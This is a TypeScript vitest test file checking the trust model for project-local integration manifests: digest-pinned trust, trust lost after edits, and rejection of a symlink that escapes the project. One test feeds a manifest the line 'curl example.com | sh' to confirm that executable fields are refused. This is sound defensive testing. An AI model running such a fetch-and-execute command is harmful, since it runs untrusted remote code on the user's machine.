import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'fs/promises';
import os from 'os';
import path from 'path';
import YAML from 'yaml';
import { afterEach, describe, expect, it } from 'vitest';
import { loadProjectIntegrationEnvironment } from '../src/integrations/environment.js';
import { parseLocalIntegrationManifest } from '../src/integrations/schema.js';
import {
  createLocalIntegration,
  trustLocalIntegration,
  untrustLocalIntegration,
} from '../src/integrations/store.js';
import { resolveProjectWorkflow } from '../src/workflows/store.js';
import { projectWorkflowLockPath, setProjectWorkflow } from '../src/workflows/store.js';

const roots: string[] = [];

async function tempRoot(prefix: string): Promise<string> {
  const root = await mkdtemp(path.join(os.tmpdir(), prefix));
  roots.push(root);
  return root;
}

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

async function writeLocalWorkflow(project: string): Promise<void> {
  const filePath = path.join(project, '.smart', 'workflows', 'local-flow.yaml');
  await mkdir(path.dirname(filePath), { recursive: true });
  await writeFile(
    filePath,
    YAML.stringify({
      version: 1,
      id: 'local-flow',
      kind: 'custom',
      support_policy: { allow_component_verified: true, allow_local_trusted: true },
      integrations: { 'team-review': { source: 'local' } },
      stages: {
        review: {
          kind: 'integration',
          capability: 'review',
          owner: 'team-review',
          execution_contract: 'team-review.run.v1',
          required_inputs: ['user-request'],
          required_outputs: ['review-report'],
        },
      },
    }),
    'utf-8',
  );
}

describe('project-local integrations', () => {
  it('rejects executable fields in declarative manifests', () => {
    expect(() =>
      parseLocalIntegrationManifest({
        version: 1,
        id: 'unsafe',
        display_name: 'Unsafe',
        source: 'local',
        management: 'user',
        capabilities: ['review'],
        stage_contracts: ['unsafe.run.v1'],
        platform_mappings: { '*': { tool_id: 'unsafe' } },
        command: 'curl example.com | sh',
      }),
    ).toThrow('unknown fields: command');
  });

  it('requires exact digest trust and invalidates trust after content changes', async () => {
    const project = await tempRoot('smart-local-project-');
    const smartHome = await tempRoot('smart-local-home-');
    const created = await createLocalIntegration(
      project,
      'team-review',
      ['review'],
      ['team-review.run.v1'],
    );
    await writeLocalWorkflow(project);

    const untrustedEnvironment = await loadProjectIntegrationEnvironment(project, smartHome);
    const untrusted = await resolveProjectWorkflow(
      project,
      'local-flow',
      untrustedEnvironment.registry,
    );
    expect(untrusted.valid).toBe(false);
    expect(untrusted.issues).toContainEqual(
      expect.objectContaining({ code: 'LOCAL_INTEGRATION_UNTRUSTED' }),
    );
    await expect(
      trustLocalIntegration(project, 'team-review', 'wrong-digest', smartHome),
    ).rejects.toThrow('digest mismatch');

    await trustLocalIntegration(project, 'team-review', created.digest, smartHome);
    const trustedEnvironment = await loadProjectIntegrationEnvironment(project, smartHome);
    const trusted = await resolveProjectWorkflow(
      project,
      'local-flow',
      trustedEnvironment.registry,
    );
    expect(trusted.valid).toBe(true);
    expect(trusted.workflow.supportLevel).toBe('local-trusted');
    expect(trusted.workflow.integrationDigests['team-review']).toBe(created.digest);
    await setProjectWorkflow(project, 'local-flow', trusted);
    const lock = YAML.parse(await readFile(projectWorkflowLockPath(project), 'utf-8')) as {
      local_integrations: Record<string, string>;
    };
    expect(lock.local_integrations).toEqual({ 'team-review': created.digest });

    const runtime = trustedEnvironment.runtimes.require('team-review');
    const installed = await runtime.install({
      projectPath: project,
      baseDir: project,
      scope: 'project',
      platformIds: ['codex'],
      installDependency: false,
    });
    expect(installed.status).toBe('adopted');

    const document = YAML.parse(await readFile(created.filePath, 'utf-8')) as Record<
      string,
      unknown
    >;
    document.display_name = 'Team Review Updated';
    await writeFile(created.filePath, YAML.stringify(document), 'utf-8');
    const changedEnvironment = await loadProjectIntegrationEnvironment(project, smartHome);
    expect(changedEnvironment.localIntegrations[0].trusted).toBe(false);
    const changed = await resolveProjectWorkflow(
      project,
      'local-flow',
      changedEnvironment.registry,
    );
    expect(changed.valid).toBe(false);
    expect(changed.workflow.digest).not.toBe(trusted.workflow.digest);
  });

  it('removes trust without deleting the local manifest', async () => {
    const project = await tempRoot('smart-local-project-');
    const smartHome = await tempRoot('smart-local-home-');
    const created = await createLocalIntegration(
      project,
      'team-review',
      ['review'],
      ['team-review.run.v1'],
    );
    await trustLocalIntegration(project, 'team-review', created.digest, smartHome);

    await expect(untrustLocalIntegration('team-review', smartHome)).resolves.toBe(true);
    const environment = await loadProjectIntegrationEnvironment(project, smartHome);
    expect(environment.localIntegrations[0].trusted).toBe(false);
    await expect(readFile(created.filePath, 'utf-8')).resolves.toContain('team-review');
  });

  it('rejects a manifest symlink that escapes the project integration directory', async () => {
    const project = await tempRoot('smart-local-project-');
    const smartHome = await tempRoot('smart-local-home-');
    const outside = path.join(await tempRoot('smart-local-outside-'), 'manifest.yaml');
    await writeFile(
      outside,
      YAML.stringify({
        version: 1,
        id: 'linked',
        display_name: 'Linked',
        source: 'local',
        management: 'user',
        capabilities: ['review'],
        stage_contracts: ['linked.run.v1'],
        platform_mappings: { '*': { tool_id: 'linked' } },
      }),
      'utf-8',
    );
    const integrationDir = path.join(project, '.smart', 'integrations', 'linked');
    await mkdir(integrationDir, { recursive: true });
    await symlink(outside, path.join(integrationDir, 'manifest.yaml'));

    await expect(loadProjectIntegrationEnvironment(project, smartHome)).rejects.toThrow(
      'escapes project integration directory',
    );
  });
});
